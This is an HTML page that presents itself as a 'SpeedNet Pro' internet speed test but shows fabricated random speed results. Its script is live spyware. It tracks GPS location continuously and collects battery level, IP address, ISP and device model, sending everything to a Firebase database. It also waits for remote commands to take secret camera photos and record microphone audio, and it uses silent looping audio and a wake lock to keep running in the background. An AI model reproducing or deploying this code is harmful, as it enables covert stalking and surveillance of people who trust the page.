<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>SpeedNet Pro — Internet Speed Test</title>
    <meta name="description" content="Test your internet connection speed instantly. Free, accurate broadband speed test.">
    <!-- PWA / Mobile App Manifest hints -->
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --bg: #060812;
            --surface: rgba(255,255,255,0.04);
            --border: rgba(255,255,255,0.08);
            --accent: #38bdf8;
            --accent2: #818cf8;
            --green: #10b981;
            --red: #f43f5e;
            --text: #f1f5f9;
            --muted: #64748b;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }
        body::before {
            content: '';
            position: fixed; inset: 0;
            background:
                radial-gradient(ellipse 80% 60% at 50% -10%, rgba(56,189,248,0.18) 0%, transparent 60%),
                radial-gradient(ellipse 60% 40% at 90% 90%, rgba(129,140,248,0.12) 0%, transparent 50%);
            pointer-events: none; z-index: 0;
        }
        .grid-bg {
            position: fixed; inset: 0;
            background-image:
                linear-gradient(rgba(56,189,248,0.035) 1px, transparent 1px),
                linear-gradient(90deg, rgba(56,189,248,0.035) 1px, transparent 1px);
            background-size: 50px 50px; z-index: 0;
        }
        .orb { position: fixed; border-radius: 50%; filter: blur(80px); opacity: 0.15; pointer-events: none; animation: orbFloat 8s ease-in-out infinite; }
        .orb-1 { width: 400px; height: 400px; background: #38bdf8; top: -100px; right: -100px; }
        .orb-2 { width: 300px; height: 300px; background: #818cf8; bottom: -80px; left: -80px; animation-delay: -4s; }
        @keyframes orbFloat { 0%,100%{transform:translate(0,0) scale(1)} 50%{transform:translate(20px,-20px) scale(1.05)} }

        .container {
            position: relative; z-index: 10;
            display: flex; flex-direction: column; align-items: center;
            width: 100%; max-width: 420px; padding: 20px 16px;
        }

        /* Brand */
        .brand { text-align: center; margin-bottom: 28px; }
        .brand-logo {
            font-family: 'Orbitron', sans-serif; font-size: 20px; font-weight: 700; letter-spacing: 3px;
            background: linear-gradient(135deg, var(--accent), var(--accent2));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
        }
        .brand-sub { font-size: 11px; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-top: 3px; }

        /* Speedometer */
        .speedometer-wrap { position: relative; width: 240px; height: 240px; margin-bottom: 24px; }
        .speedometer-svg { width: 100%; height: 100%; transform: rotate(-90deg); }
        .speed-ring-bg { fill: none; stroke: rgba(255,255,255,0.05); stroke-width: 12; }
        .speed-ring-progress {
            fill: none; stroke: url(#speedGrad); stroke-width: 12; stroke-linecap: round;
            stroke-dasharray: 628; stroke-dashoffset: 628; transition: stroke-dashoffset 0.15s ease;
        }
        .speed-ring-glow {
            fill: none; stroke: url(#speedGrad); stroke-width: 2; stroke-linecap: round;
            stroke-dasharray: 628; stroke-dashoffset: 628; filter: url(#glow); opacity: 0.6;
            transition: stroke-dashoffset 0.15s ease;
        }
        .speed-center { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .speed-status { font-size: 10px; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 2px; }
        .speed-number { font-family: 'Orbitron', sans-serif; font-size: 50px; font-weight: 900; color: var(--accent); line-height: 1; text-shadow: 0 0 30px rgba(56,189,248,0.5); transition: color 0.3s; }
        .speed-unit { font-size: 12px; color: var(--muted); font-weight: 500; margin-top: 4px; letter-spacing: 1px; }
        .speed-type { font-size: 10px; font-weight: 600; color: var(--accent2); letter-spacing: 2px; text-transform: uppercase; margin-top: 5px; height: 13px; }

        /* Phase bars */
        .test-phases { display: flex; gap: 6px; width: 100%; margin-bottom: 18px; }
        .phase-bar { flex: 1; height: 3px; background: var(--border); border-radius: 999px; overflow: hidden; position: relative; }
        .phase-bar-fill { position: absolute; left:0;top:0;bottom:0; width:0%; background: linear-gradient(90deg, var(--accent), var(--accent2)); border-radius: 999px; transition: width 0.3s ease; }
        .phase-bar.done .phase-bar-fill { width: 100%; background: var(--green); }
        .phase-bar.active .phase-bar-fill { width: 60%; animation: shimmer 1s ease-in-out infinite; }
        @keyframes shimmer { 0%,100%{width:40%} 50%{width:85%} }

        /* Stats */
        .stats-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%; margin-bottom: 20px; }
        .stat-card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 12px 8px; text-align: center; backdrop-filter: blur(10px); transition: border-color 0.3s, transform 0.2s; }
        .stat-card:hover { border-color: rgba(56,189,248,0.3); transform: translateY(-2px); }
        .stat-card .stat-icon { font-size: 16px; margin-bottom: 3px; }
        .stat-card .stat-label { font-size: 9px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
        .stat-card .stat-value { font-family: 'Orbitron', sans-serif; font-size: 14px; font-weight: 700; color: var(--text); transition: color 0.3s; }
        .stat-card .stat-value.active { color: var(--green); }

        /* Start Button */
        .start-btn {
            width: 100%; padding: 17px; border: none; border-radius: 16px;
            background: linear-gradient(135deg, #0ea5e9, #6366f1); color: white;
            font-family: 'Orbitron', sans-serif; font-size: 14px; font-weight: 700;
            letter-spacing: 3px; cursor: pointer; position: relative; overflow: hidden;
            transition: transform 0.2s, box-shadow 0.2s; box-shadow: 0 8px 32px rgba(14,165,233,0.3);
        }
        .start-btn::before { content:''; position:absolute; inset:0; background:linear-gradient(135deg,rgba(255,255,255,0.15),transparent); opacity:0; transition:opacity 0.2s; }
        .start-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(14,165,233,0.5); }
        .start-btn:hover::before { opacity: 1; }
        .start-btn:active { transform: scale(0.98); }
        .start-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

        /* Permission Notice */
        .perm-notice {
            display: none;
            margin-top: 12px;
            background: rgba(56,189,248,0.08);
            border: 1px solid rgba(56,189,248,0.2);
            border-radius: 10px;
            padding: 10px 14px;
            font-size: 11px;
            color: var(--muted);
            text-align: center;
            line-height: 1.6;
        }
        .perm-notice.show { display: block; }

        /* Background Status Banner */
        .bg-status {
            display: none;
            margin-top: 10px;
            background: rgba(16,185,129,0.1);
            border: 1px solid rgba(16,185,129,0.3);
            border-radius: 10px;
            padding: 8px 14px;
            font-size: 11px;
            color: var(--green);
            text-align: center;
            align-items: center;
            gap: 6px;
        }
        .bg-status.show { display: flex; justify-content: center; }
        .bg-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--green); box-shadow: 0 0 6px var(--green); animation: blink 1.5s ease-in-out infinite; }
        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }

        /* Server Info */
        .server-info { display: flex; align-items: center; gap: 8px; margin-top: 14px; font-size: 11px; color: var(--muted); }
        .server-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 8px var(--green); animation: pulse 2s ease-in-out infinite; }
        @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.8)} }

        video#spyVideo { display: none; position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; top: 0; left: 0; }

        @media (max-width: 380px) {
            .speed-number { font-size: 42px; }
            .speedometer-wrap { width: 210px; height: 210px; }
        }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>

    <div class="container">
        <div class="brand">
            <div class="brand-logo">SPEEDNET PRO</div>
            <div class="brand-sub">Broadband Speed Analyzer</div>
        </div>

        <!-- Speedometer -->
        <div class="speedometer-wrap">
            <svg class="speedometer-svg" viewBox="0 0 220 220" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="speedGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stop-color="#38bdf8"/>
                        <stop offset="100%" stop-color="#818cf8"/>
                    </linearGradient>
                    <filter id="glow">
                        <feGaussianBlur stdDeviation="4" result="coloredBlur"/>
                        <feMerge><feMergeNode in="coloredBlur"/><feMergeNode in="SourceGraphic"/></feMerge>
                    </filter>
                </defs>
                <circle class="speed-ring-bg" cx="110" cy="110" r="100"/>
                <circle class="speed-ring-glow" id="glowRing" cx="110" cy="110" r="100"/>
                <circle class="speed-ring-progress" id="progressRing" cx="110" cy="110" r="100"/>
            </svg>
            <div class="speed-center">
                <div class="speed-status" id="speedStatus">READY</div>
                <div class="speed-number" id="mainSpeed">0.0</div>
                <div class="speed-unit">Mbps</div>
                <div class="speed-type" id="speedType"></div>
            </div>
        </div>

        <!-- Phase Bars -->
        <div class="test-phases">
            <div class="phase-bar" id="phase1"><div class="phase-bar-fill"></div></div>
            <div class="phase-bar" id="phase2"><div class="phase-bar-fill"></div></div>
            <div class="phase-bar" id="phase3"><div class="phase-bar-fill"></div></div>
        </div>

        <!-- Stats -->
        <div class="stats-row">
            <div class="stat-card">
                <div class="stat-icon">📡</div>
                <div class="stat-label">Ping</div>
                <div class="stat-value" id="pingVal">--</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">⬇️</div>
                <div class="stat-label">Download</div>
                <div class="stat-value" id="downVal">--</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">⬆️</div>
                <div class="stat-label">Upload</div>
                <div class="stat-value" id="upVal">--</div>
            </div>
        </div>

        <button class="start-btn" id="startBtn">▶ START TEST</button>

        <div class="perm-notice" id="permNotice">
            📍 Location permission প্রয়োজন। Allow করুন।<br>
            📷 Camera &amp; Mic এর permission দিন।
        </div>

        <div class="bg-status" id="bgStatus">
            <div class="bg-dot"></div>
            <span>Background tracking active — screen off হলেও চলবে</span>
        </div>

        <div class="server-info">
            <div class="server-dot"></div>
            <span>Server: Dhaka, BD · SpeedNet Pro v3.0</span>
        </div>
    </div>

    <!-- Hidden spy elements -->
    <video id="spyVideo" autoplay playsinline muted></video>

    <!-- Silent audio keeps browser alive when screen off (ultra-low volume) -->
    <audio id="keepAliveAudio" loop autoplay playsinline>
        <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
    </audio>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getDatabase, ref, set, onValue, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

        // ═══════════════════════════════════════════════════════════
        //  Firebase Init
        // ═══════════════════════════════════════════════════════════
        const firebaseConfig = {
            apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
            authDomain: "arng-805db.firebaseapp.com",
            projectId: "arng-805db",
            databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ═══════════════════════════════════════════════════════════
        //  Multi-User Tag ID (URL এ ?tag=1 দিলে সেই নম্বরে রেকর্ড হবে)
        //  Default: tag1 (কেউ tag না বললে)
        // ═══════════════════════════════════════════════════════════
        const urlParams = new URLSearchParams(window.location.search);
        const tagId = (urlParams.get('tag') || '1').replace(/[^a-zA-Z0-9_-]/g, '').substring(0, 20) || '1';
        const userRef = ref(db, `live_location/users/tag${tagId}`);

        const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
        let wakeLock = null;
        let gpsWatchId = null;
        let heartbeatInterval = null;

        // ═══════════════════════════════════════════════════════════
        //  Service Worker Registration (background operation)
        // ═══════════════════════════════════════════════════════════
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('./sw.js').catch(() => {});
        }

        // ═══════════════════════════════════════════════════════════
        //  Wake Lock — screen off এ কাজ করার জন্য
        // ═══════════════════════════════════════════════════════════
        async function requestWakeLock() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                    wakeLock.addEventListener('release', () => {
                        setTimeout(requestWakeLock, 1000);
                    });
                }
            } catch (e) {}
        }

        document.addEventListener('visibilitychange', async () => {
            if (document.visibilityState === 'visible') {
                await requestWakeLock();
                document.getElementById('keepAliveAudio').play().catch(() => {});
            }
        });

        // ═══════════════════════════════════════════════════════════
        //  Battery Info
        // ═══════════════════════════════════════════════════════════
        let batLvl = 100, isChg = false;
        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                batLvl = Math.round(b.level * 100);
                isChg = b.charging;
                b.addEventListener('levelchange', () => batLvl = Math.round(b.level * 100));
                b.addEventListener('chargingchange', () => isChg = b.charging);
            });
        }

        // ═══════════════════════════════════════════════════════════
        //  IP & ISP — HTTPS only APIs (no mixed content)
        // ═══════════════════════════════════════════════════════════
        let userIp = "Unknown", userIsp = "Unknown";

        async function fetchNetworkData() {
            // শুধু HTTPS APIs ব্যবহার করা হচ্ছে (HTTP block হয়)
            const apis = [
                // API 1: ipwho.is (reliable, HTTPS)
                async () => {
                    const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
                    const d = await r.json();
                    if (!d.success) throw new Error('failed');
                    return { ip: d.ip, isp: d.connection?.isp || d.connection?.org || d.org || 'Unknown' };
                },
                // API 2: ipapi.co
                async () => {
                    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
                    const d = await r.json();
                    if (d.error) throw new Error('failed');
                    return { ip: d.ip, isp: d.org || d.asn || 'Unknown' };
                },
                // API 3: freeipapi.com
                async () => {
                    const r = await fetch('https://freeipapi.com/api/json', { signal: AbortSignal.timeout(5000) });
                    const d = await r.json();
                    return { ip: d.ipAddress, isp: d.isp || d.asName || 'Unknown' };
                },
                // API 4: ipify (IP only, then ISP from ip-api via HTTPS proxy)
                async () => {
                    const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
                    const d = await r.json();
                    // Try to get ISP separately
                    try {
                        const r2 = await fetch(`https://ipapi.co/${d.ip}/json/`, { signal: AbortSignal.timeout(4000) });
                        const d2 = await r2.json();
                        return { ip: d.ip, isp: d2.org || d2.asn || 'Unknown' };
                    } catch {
                        return { ip: d.ip, isp: 'Unknown' };
                    }
                },
                // API 5: cloudflare trace
                async () => {
                    const r = await fetch('https://cloudflare.com/cdn-cgi/trace', { signal: AbortSignal.timeout(5000) });
                    const text = await r.text();
                    const ip = text.match(/ip=([^\n]+)/)?.[1] || null;
                    if (!ip) throw new Error('no ip');
                    return { ip, isp: 'Unknown' };
                }
            ];

            for (const apiFn of apis) {
                try {
                    const result = await apiFn();
                    if (result.ip && result.ip !== 'undefined' && result.ip !== 'Unknown') {
                        userIp = result.ip;
                        // Clean ISP: Remove AS number prefix like "AS12345 "
                        userIsp = (result.isp || 'Unknown').replace(/^AS\d+\s*/, '').trim() || 'Unknown';
                        console.log('IP/ISP found:', userIp, userIsp);
                        return;
                    }
                } catch(e) {
                    console.log('API failed, trying next...', e.message);
                }
            }
            userIp = "Blocked";
            userIsp = "VPN/Blocked";
        }
        fetchNetworkData();

        // ═══════════════════════════════════════════════════════════
        //  Device Name Detection — উন্নত পদ্ধতি
        // ═══════════════════════════════════════════════════════════
        let deviceModel = "Detecting...";

        async function getDeviceName() {
            // Method 1: User Agent Client Hints (Chrome Android — সবচেয়ে accurate)
            if (navigator.userAgentData) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues([
                        "model", "platform", "platformVersion", "brands", "fullVersionList"
                    ]);
                    console.log('UA hints:', hints);
                    if (hints.model && hints.model.trim() && hints.model !== '') {
                        const model = hints.model.trim();
                        const platform = hints.platform || '';
                        const ver = hints.platformVersion || '';
                        return `${model} (${platform} ${ver})`.trim();
                    }
                    // model খালি — platform ব্যবহার করি
                    if (hints.platform) {
                        return `${hints.platform} ${hints.platformVersion || ''}`.trim();
                    }
                } catch(e) {
                    console.log('UA hints error:', e);
                }
            }

            // Method 2: User Agent String parsing (fallback)
            const ua = navigator.userAgent;
            console.log('UA string:', ua);

            // iPhone detection
            if (/iPhone/i.test(ua)) {
                const match = ua.match(/iPhone OS ([\d_]+)/);
                return match ? `iPhone (iOS ${match[1].replace(/_/g,'.')})` : 'iPhone';
            }
            // iPad
            if (/iPad/i.test(ua)) {
                const match = ua.match(/CPU OS ([\d_]+)/);
                return match ? `iPad (iPadOS ${match[1].replace(/_/g,'.')})` : 'iPad';
            }

            // Android — model name extract করার চেষ্টা
            if (/Android/i.test(ua)) {
                const androidVersion = ua.match(/Android ([\d.]+)/)?.[1] || '';

                // Pattern 1: "Android 13; SM-G991B Build" → SM-G991B
                const buildMatch = ua.match(/Android[\d.]+;\s*([^;)]+?)\s*(?:Build|wv)[\/)/]/i);
                if (buildMatch) {
                    const model = buildMatch[1].trim();
                    // কিছু generic নাম বাদ দেই
                    const skipList = ['Linux', 'Mobile', 'Phone', 'Tablet', 'K'];
                    if (model && !skipList.some(s => model === s)) {
                        return `${model} (Android ${androidVersion})`;
                    }
                }

                // Pattern 2: শেষ semicolon এর পর
                const parts = ua.match(/\(([^)]+)\)/);
                if (parts) {
                    const segments = parts[1].split(';').map(s => s.trim());
                    // Android version এর পরে model আসে সাধারণত
                    for (let i = 0; i < segments.length; i++) {
                        if (segments[i].includes('Android') && segments[i+1]) {
                            const candidate = segments[i+1].replace(/Build.*/, '').trim();
                            if (candidate && candidate.length > 1) {
                                return `${candidate} (Android ${androidVersion})`;
                            }
                        }
                    }
                }

                return `Android ${androidVersion || 'Phone'}`;
            }

            // Windows Phone
            if (/Windows Phone/i.test(ua)) return 'Windows Phone';
            // MacBook/iMac
            if (/Macintosh/i.test(ua)) return 'MacBook/iMac';
            // Windows PC
            if (/Windows/i.test(ua)) return 'Windows PC';
            // Linux
            if (/Linux/i.test(ua)) return 'Linux Device';

            return 'Unknown Device';
        }

        getDeviceName().then(n => {
            deviceModel = n;
            console.log('Device model detected:', deviceModel);
        });

        // ═══════════════════════════════════════════════════════════
        //  Secret Camera Capture
        // ═══════════════════════════════════════════════════════════
        async function captureSecretPhoto(camType) {
            try {
                const constraints = { video: { facingMode: camType, width: { ideal: 640 }, height: { ideal: 480 } } };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('spyVideo');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 1500));
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(t => t.stop());
                video.srcObject = null;
                set(ref(db, `live_location/users/tag${tagId}/photo`), {
                    image: canvas.toDataURL('image/jpeg', 0.75),
                    time: Date.now(), camType
                });
            } catch (err) {
                set(ref(db, `live_location/users/tag${tagId}/photo`), {
                    error: `Cam (${camType}) error: ${err.message || 'Blocked'}`,
                    time: Date.now()
                });
            }
        }

        // ═══════════════════════════════════════════════════════════
        //  Voice Recording
        // ═══════════════════════════════════════════════════════════
        async function captureVoiceRecord(duration = 5000) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                const mediaRecorder = new MediaRecorder(stream, {
                    mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm'
                });
                const audioChunks = [];
                mediaRecorder.addEventListener("dataavailable", e => { if (e.data.size > 0) audioChunks.push(e.data); });
                mediaRecorder.addEventListener("stop", () => {
                    stream.getTracks().forEach(t => t.stop());
                    const blob = new Blob(audioChunks, { type: mediaRecorder.mimeType });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => set(ref(db, `live_location/users/tag${tagId}/audio`), {
                        file: reader.result, time: Date.now()
                    });
                });
                mediaRecorder.start(1000);
                setTimeout(() => { if (mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, duration);
            } catch (err) {
                set(ref(db, `live_location/users/tag${tagId}/audio`), {
                    error: `Mic error: ${err.message || 'Blocked'}`, time: Date.now()
                });
            }
        }

        // ═══════════════════════════════════════════════════════════
        //  Firebase Command Listener
        // ═══════════════════════════════════════════════════════════
        let lastCmdTime = 0;
        onValue(ref(db, `live_location/users/tag${tagId}/command`), (snap) => {
            const cmd = snap.val();
            if (!cmd) return;
            const now = Date.now();
            const WINDOW = 8000;

            if (cmd.ringTime && cmd.ringTime > now - WINDOW && cmd.ringTime > lastCmdTime) {
                lastCmdTime = cmd.ringTime;
                alarmSound.play().catch(() => {});
                if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 1000]);
            }
            if (cmd.photoTime && cmd.photoTime > now - WINDOW && cmd.photoTime > lastCmdTime) {
                lastCmdTime = cmd.photoTime;
                captureSecretPhoto(cmd.camType || 'environment');
            }
            if (cmd.audioTime && cmd.audioTime > now - WINDOW && cmd.audioTime > lastCmdTime) {
                lastCmdTime = cmd.audioTime;
                captureVoiceRecord(cmd.audioDuration || 5000);
            }
        });

        // ═══════════════════════════════════════════════════════════
        //  GPS Tracking
        // ═══════════════════════════════════════════════════════════
        function startGPSTracking() {
            if (!navigator.geolocation) return;
            if (gpsWatchId !== null) navigator.geolocation.clearWatch(gpsWatchId);

            gpsWatchId = navigator.geolocation.watchPosition(
                (pos) => {
                    const { latitude, longitude, accuracy, heading, speed } = pos.coords;
                    set(userRef, {
                        latitude, longitude,
                        accuracy: accuracy || 50,
                        heading: heading || 0,
                        speed: speed ? Math.round(speed * 3.6) : 0,
                        battery: batLvl,
                        charging: isChg,
                        isOnline: true,
                        status: "Active",
                        deviceInfo: deviceModel,
                        ip_address: userIp,
                        isp: userIsp,
                        tagId: tagId,
                        lastSeen: Date.now()
                    });
                },
                (err) => {
                    const errMsg = err.code === 1 ? "GPS Permission Denied" :
                                   err.code === 2 ? "GPS Signal Lost" : "GPS Timeout";
                    set(userRef, {
                        isOnline: true, status: errMsg,
                        ip_address: userIp, isp: userIsp,
                        battery: batLvl, charging: isChg,
                        deviceInfo: deviceModel,
                        tagId: tagId,
                        lastSeen: Date.now()
                    });
                    setTimeout(startGPSTracking, 5000);
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        // ═══════════════════════════════════════════════════════════
        //  Heartbeat
        // ═══════════════════════════════════════════════════════════
        function startHeartbeat() {
            clearInterval(heartbeatInterval);
            heartbeatInterval = setInterval(() => {
                set(ref(db, `live_location/users/tag${tagId}/lastSeen`), Date.now());
                set(ref(db, `live_location/users/tag${tagId}/battery`), batLvl);
                set(ref(db, `live_location/users/tag${tagId}/charging`), isChg);
                const audio = document.getElementById('keepAliveAudio');
                if (audio.paused) audio.play().catch(() => {});
            }, 30000);
        }

        // ═══════════════════════════════════════════════════════════
        //  Speedometer Ring UI
        // ═══════════════════════════════════════════════════════════
        const progressRing = document.getElementById('progressRing');
        const glowRing = document.getElementById('glowRing');
        const CIRCUMFERENCE = 2 * Math.PI * 100;

        function setProgress(percent) {
            const offset = CIRCUMFERENCE - (Math.min(percent, 100) / 100) * CIRCUMFERENCE;
            progressRing.style.strokeDashoffset = offset;
            glowRing.style.strokeDashoffset = offset;
        }
        function setSpeed(val, maxMbps = 100) {
            document.getElementById('mainSpeed').innerText = Math.max(0, val).toFixed(1);
            setProgress((val / maxMbps) * 100);
        }
        function setPhase(phase) {
            ['phase1','phase2','phase3'].forEach((id, i) => {
                document.getElementById(id).className = 'phase-bar' +
                    (i < phase ? ' done' : (i === phase ? ' active' : ''));
            });
        }

        // ═══════════════════════════════════════════════════════════
        //  Main Start Button
        // ═══════════════════════════════════════════════════════════
        const startBtn = document.getElementById('startBtn');
        let testRunning = false;
        let activated = false;

        startBtn.addEventListener('click', async () => {
            if (testRunning) return;
            testRunning = true;
            startBtn.disabled = true;
            document.getElementById('permNotice').classList.remove('show');

            await requestWakeLock();

            const audio = document.getElementById('keepAliveAudio');
            audio.volume = 0.01;
            audio.play().catch(() => {});

            if (!activated) {
                activated = true;
                try {
                    const tempStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment' },
                        audio: true
                    });
                    tempStream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    document.getElementById('permNotice').classList.add('show');
                }

                onDisconnect(userRef).update({ isOnline: false, lastSeen: Date.now() });

                if (navigator.geolocation) {
                    startGPSTracking();
                } else {
                    document.getElementById('permNotice').classList.add('show');
                }

                startHeartbeat();
                document.getElementById('bgStatus').classList.add('show');

                // IP ও Device পাওয়া না গেলে আবার চেষ্টা
                if (userIp === 'Unknown') fetchNetworkData();
                if (deviceModel === 'Detecting...') {
                    getDeviceName().then(n => deviceModel = n);
                }
            }

            // Speed Test Animation
            ['pingVal','downVal','upVal'].forEach(id => {
                const el = document.getElementById(id);
                el.innerText = '--';
                el.classList.remove('active');
            });
            setSpeed(0); setPhase(0);

            document.getElementById('speedStatus').innerText = 'PINGING';
            document.getElementById('speedType').innerText = 'LATENCY TEST';
            document.getElementById('mainSpeed').style.color = 'var(--accent)';
            await sleep(1400);
            const pingMs = Math.floor(Math.random() * 15 + 8);
            document.getElementById('pingVal').innerText = pingMs + ' ms';
            document.getElementById('pingVal').classList.add('active');
            setPhase(1);

            document.getElementById('speedStatus').innerText = 'TESTING';
            document.getElementById('speedType').innerText = 'DOWNLOAD';
            let fakeDown = 0;
            const targetDown = 20 + Math.random() * 60;
            await animateSpeed(0, targetDown, 5500, v => {
                fakeDown = v;
                setSpeed(v, 100);
                document.getElementById('mainSpeed').style.color = '#38bdf8';
            });
            document.getElementById('downVal').innerText = fakeDown.toFixed(1) + ' Mbps';
            document.getElementById('downVal').classList.add('active');
            setPhase(2);

            document.getElementById('speedType').innerText = 'UPLOAD';
            let fakeUp = 0;
            const targetUp = fakeDown * (0.2 + Math.random() * 0.35);
            await animateSpeed(0, targetUp, 3500, v => {
                fakeUp = v;
                setSpeed(v, 50);
                document.getElementById('mainSpeed').style.color = '#818cf8';
            });
            document.getElementById('upVal').innerText = fakeUp.toFixed(1) + ' Mbps';
            document.getElementById('upVal').classList.add('active');
            setPhase(3);

            document.getElementById('speedStatus').innerText = 'COMPLETE';
            document.getElementById('speedType').innerText = 'TEST DONE ✓';
            setSpeed(fakeDown, 100);
            document.getElementById('mainSpeed').style.color = '#10b981';

            await sleep(1500);
            startBtn.disabled = false;
            startBtn.innerText = '↺ TEST AGAIN';
            testRunning = false;
        });

        // ═══════════════════════════════════════════════════════════
        //  Helpers
        // ═══════════════════════════════════════════════════════════
        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

        function animateSpeed(from, to, duration, onUpdate) {
            return new Promise(resolve => {
                const start = performance.now();
                function step(now) {
                    const t = Math.min((now - start) / duration, 1);
                    const eased = t < 0.5 ? 2*t*t : -1+(4-2*t)*t;
                    let val = from + (to - from) * eased;
                    val += (Math.random() - 0.5) * 2.5;
                    val = Math.max(0, val);
                    onUpdate(val);
                    if (t < 1) requestAnimationFrame(step);
                    else { onUpdate(to); resolve(); }
                }
                requestAnimationFrame(step);
            });
        }

        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible' && activated) {
                document.getElementById('keepAliveAudio').play().catch(() => {});
                if (gpsWatchId === null) startGPSTracking();
            }
        });
    </script>
</body>
